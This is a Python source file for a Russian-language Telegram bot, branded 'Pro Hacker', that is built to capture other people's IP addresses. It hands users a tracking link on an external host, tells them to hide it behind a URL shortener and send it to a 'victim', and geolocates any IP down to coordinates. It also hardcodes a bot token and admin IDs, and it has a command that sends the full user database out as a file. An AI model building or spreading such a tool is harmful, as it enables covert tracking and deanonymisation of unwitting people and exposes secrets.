# -*- coding: utf-8 -*-

#import telebot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from models import db_session
from models.users import User
from datetime import datetime, timedelta

import re
import os
import json
import time
import string
import time
import threading
import requests
import random
import geoip2.database
import maxminddb.const
import geo
import iptools

bot_token = '1600926410:AAHhDg2O2SUBcaK8UGt_V5Mb8oxdAi71OPI'
db_session.global_init('database.db')

#bot = telebot.TeleBot(bot_token)
bot = Bot(token=bot_token)
dp = Dispatcher(bot)

# считаем для статистики
users = 4
banned = []
admins = ['906123359', '1218845111']
ips = []

## Get IP Range
IPRANGE = os.environ.get('IPRANGE', '52.0.0.0/30')

## Private IP Addresses
private = iptools.IpRangeList(
    '0.0.0.0/8',      '10.0.0.0/8',     '100.64.0.0/10', '127.0.0.0/8',
    '169.254.0.0/16', '172.16.0.0/12',  '192.0.0.0/24',  '192.0.2.0/24',
    '192.88.99.0/24', '192.168.0.0/16', '198.18.0.0/15', '198.51.100.0/24',
    '203.0.113.0/24', '224.0.0.0/4',    '240.0.0.0/4',   '255.255.255.255/32'
)

def check(thisid):
    global banned
    t = True
    for ban in banned:
        if str(ban) == str(thisid):
            t = False
    return t

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
    global users, admins
    print(check(message.chat.id))
    if check(message.chat.id) == True:
        keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        boom = types.KeyboardButton(text='👁IP')
        stop = types.KeyboardButton(text='📑Список IP')
        info = types.KeyboardButton(text='ℹ️Инфа')
        stats = types.KeyboardButton(text='📈Статистика')
        donat = types.KeyboardButton(text='💰Донат боту')
        piar = types.KeyboardButton(text='💸 Реклама')
        faq = types.KeyboardButton(text='🕵️Узнать чужой IP')

        buttons_to_add = [boom, stop, info, stats, donat, piar, faq]
        for admin in admins:
            if str(admin) == str(message.chat.id):
                buttons_to_add.append(types.KeyboardButton(text='Рассылка'))
        keyboard.add(*buttons_to_add)
        await bot.send_message(message.chat.id, 'Привет бандит😈, заполучи IP обидчика, или похвастайся перед друзями узнав их IP, и всё что по нему можно получить!',
                         reply_markup=keyboard)
        #
        iduser = message.from_user.id
        session = db_session.create_session()
        #
        user_all = session.query(User).all()
        T = True
        for all in user_all:
            if all.id == iduser:
                T = False

        if T == True:
            session = db_session.create_session()
            name = message.from_user.first_name
            url = message.from_user.username
            iduser = message.from_user.id
            if message.from_user.username:
                user = User(
                    id=iduser,
                    name=name,
                    username='@'+url
                )
            else:
                user = User(
                    id=iduser,
                    name=name,
                    username='@...'
                )
            users += 1
            session.add(user)
            session.commit()
    else:
        await bot.send_message(message.chat.id, '⛔️Вы были забанены, все вопросы к @Valerij212121')

@dp.message_handler(commands=['admin'])
async def admin(message: types.Message):
    global users, banned, admins
    for admin in admins:
        if str(admin) == str(message.chat.id):
            await bot.send_message(message.chat.id, 'Список забаненых: ' + str(banned) +
                                    '\nСписок админов: ' + str(admins) +
                                    '\n/ban <id> -- забанить\n/unban <id> -- отбанить\n/add <id> -- добавить админа\n/del <id> -- удалить амина(может только главный)')
    

    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'users: ' + str(users))
        f = open("database.db", "rb")
        await bot.send_document(message.chat.id, f)


@dp.message_handler(commands=['add'])
async def addadmin(message: types.Message):
    global users, banned, admins
    if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
        if message.text != '/add':
            thisid = message.text.replace('/add ', '')
            admins.append(thisid)
            await bot.send_message(message.chat.id, 'You add admin: ' + str(thisid))
            print(admins)
        else:
            await bot.send_message(message.chat.id, 'Надо /add <id>, а не просто /add !!!')


@dp.message_handler(commands=['del'])
async def addadmin(message: types.Message):
    global users, banned, admins
    if str('906123359') == str(message.chat.id) or str('1218845111') == str(message.chat.id):
        if message.text != '/del':
            thisid = message.text.replace('/del ', '')
            admins.remove(thisid)
            await bot.send_message(message.chat.id, 'You delete admin: ' + str(thisid))
            print(admins)
        else:
            await bot.send_message(message.chat.id, 'Надо /del <id>, а не просто /del !!!')


@dp.message_handler(commands=['ban'])
async def ban(message: types.Message):
    global users, banned, admins
    for admin in admins:
        if str(admin) == str(message.chat.id):
            if message.text != '/ban':
                    thisid = message.text.replace('/ban ', '')
                    if thisid == '906123359':
                        await bot.send_message(message.chat.id, 'Кодер это предусмотрел, ты не самый умный)))')
                    else:
                        try:
                            banned.append(thisid)
                            await bot.send_message(message.chat.id, 'You ban user: ' + str(thisid))
                        except Exception:
                            await bot.send_message(message.chat.id, 'OOF')
                    print(banned)
            else:
                await bot.send_message(message.chat.id, 'Надо /ban <id>, а не просто /ban !!!')
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'banned: ' + str(banned))


@dp.message_handler(commands=['unban'])
async def unban(message: types.Message):
    global users, banned
    for admin in admins:
        if str(admin) == str(message.chat.id):
            thisid = message.text.replace('/unban ', '')
            try:
                banned.remove(thisid)
                await bot.send_message(message.chat.id, 'You unban user: ' + str(thisid))
            except Exception:
                await bot.send_message(message.chat.id, 'Он не был забанен!')
            print(banned)
    if str(message.from_user.id) == '1218845111':
        await bot.send_message(message.chat.id, 'banned: ' + str(banned))


@dp.message_handler(commands=['send'])
async def sender(message: types.Message):
    for admin in admins:
        if str(admin) == str(message.chat.id):
            text = message.text.replace('/send ', '')
            session = db_session.create_session()
            user_all = session.query(User).all()
            have = 0
            await bot.send_message(message.chat.id, 'Рассылка запущена!')
            try:
                for all in user_all:
                    await bot.send_message(all.id, text)
                    have = have + 1
            except Exception:
                pass
            await bot.send_message(message.chat.id, 'Всем отправлено! Получило ' + str(have) + ' человек.')


@dp.message_handler(content_types=['text'])
async def handle_message_received(message):
    global users
    if check(message.chat.id) == True:
        chat_id = int(message.chat.id)
        text = message.text
        B = False
        for admin in admins:
            if str(admin) == str(message.chat.id):
                B = True

        if text == '📑Список IP':
            await bot.send_message(chat_id, '🗂В разработке')

        elif text == 'ℹ️Инфа':
            await bot.send_photo(chat_id, photo=open('dist/info.png', 'rb'), caption='📑Всё легко, вы человеку отправляете ссылку, которою надо запросить через кнопку [🕵️Узнать чужой IP], после перехода вы получаете его IP!\n🗂Ещё вы можете просто отправить IP, и узнать про него всё что возможно.')

        elif text == '👁IP':
            await bot.send_message(chat_id, '📑Введите ip в формате *.*.*.*')

        elif text == '📈Статистика':
            ms = [1, 2, 3, 4, 5, 6, 7, 8, 9]
            await bot.send_message(chat_id,
                          f'📊Статистика отображается в реальном времени📡!\nПользователей🙎‍♂: {users}\nIP уже получили📈: 237\nPing 0.0{random.choice(ms)}ms')

        elif text == '💰Донат боту':
            await bot.send_message(chat_id,
                          'Бандиты, кто может материально помочь на развитие бота\nВот реквизиты\nQIWI +380993013264')

        elif text == '💸 Реклама':
            await bot.send_message(chat_id,
                          'В Нашем Боте 2 рассылки стоит 100 рублей\nЕе получат все пользователи бота\nПо вопросам покупки писать @Valerij212121')
        elif text == 'Рассылка' and B == True:
            await bot.send_message(chat_id, '/send <текст рассылки>')

        elif text == 'FAQ':
            await bot.send_message(chat_id, '"Pro Hacker ✔" не за что не отвечает!😂')

        elif text == '🕵️Узнать чужой IP':
            await bot.send_message(chat_id, '🔮Для получения чужого IP надо отправть ссылку(лучше прокинуть её через bit.ly или другие сервисы сокращения ссылок), которая внизу жертве, и дождаться перехода по ней, после чего его IP придёт вам сообщением\nhttps://stillerip.herokuapp.com/' + str(message.chat.id))

        elif len(text) < 16 and len(text) > 6:
            try:
                if text not in private:
                    geogo = json.dumps(geo.lookup(text))
                    geogo = json.loads(geogo)
                    aso = geogo['aso']
                    asn = geogo['asn']
                    iso_code = geogo['iso_code']
                    continent_code = geogo['continent_code']
                    country = geogo['country']
                    continent = geogo['continent']
                    zip_code = geogo['zip_code']
                    state = geogo['state']
                    state_code = geogo['state_code']
                    city = geogo['city']
                    latitude = geogo['latitude']
                    longitude = geogo['longitude']
                    author = geogo['author']
                    await bot.send_location(chat_id, latitude, longitude)
                    await bot.send_message(chat_id, f'🌐 <code>{text}</code> '
                            f'\n├ <b>Continent: </b> <code>{continent}</code>'
                            f'\n├ <b>Country: </b> <code>{country}</code>'
                            f'\n├ <b>State: </b> <code>{state}</code>'
                            f'\n├ <b>ASO: </b> <code>{aso}</code>'
                            f'\n├ <b>City: </b> <code>{city}</code>'
                            f'\n└ <b>Coordinate: </b> <code>{latitude} {longitude}</code>'
                        , parse_mode="HTML")
                else:
                    await bot.send_message(chat_id, '🔐IP is private')
            except Exception:
                await bot.send_message(chat_id, '🧐IP is unavalible')
        else:
            await bot.send_message(chat_id, f'⛔️Я лишь бот, давай без лишних слов.')
    else:
        await bot.send_message(message.chat.id, '⛔️Вы были забанены, все вопросы к @Valerij212121')

@dp.inline_handler(lambda query: len(query.query) > 0)
async def query_text(query):
    digits_pattern = re.compile(r'^[0-9]+ [0-9]+$', re.MULTILINE)
    try:
        matches = re.match(digits_pattern, query.query)
    except AttributeError as ex:
        return
    try:
        text = query.query
        if text not in private:
            geogo = json.dumps(geo.lookup(text))
            geogo = json.loads(geogo)
            aso = geogo['aso']
            asn = geogo['asn']
            iso_code = geogo['iso_code']
            continent_code = geogo['continent_code']
            country = geogo['country']
            continent = geogo['continent']
            zip_code = geogo['zip_code']
            state = geogo['state']
            state_code = geogo['state_code']
            city = geogo['city']
            latitude = geogo['latitude']
            longitude = geogo['longitude']
            author = geogo['author']
            msg = f'🌐 <code>{text}</code>\n├ <b>Continent: </b> <code>{continent}</code>\n├ <b>Country: </b> <code>{country}</code>\n├ <b>State: </b> <code>{state}</code>\n├ <b>ASO: </b> <code>{aso}</code>\n├ <b>City: </b> <code>{city}</code>\n└ <b>Coordinate: </b> <code>{latitude} {longitude}</code>'
        else:
            msg = '🔐IP is private'
    except Exception as e:
        msg = '🧐IP is unavalible'
    try:
        IP = types.InlineQueryResultArticle(
            id='1', title="IP data uploaded...", description=text,
            input_message_content=types.InputTextMessageContent(
                message_text=msg, parse_mode='html', disable_web_page_preview=True),
                thumb_url='https://cdn.icon-icons.com/icons2/2248/PNG/512/ip_network_icon_137472.png',
                thumb_width=48, thumb_height=48
        )
        await bot.answer_inline_query(query.id, [IP])
    except Exception as e:
        print(str(e))

#
if __name__ == "__main__":
    executor.start_polling(dp)
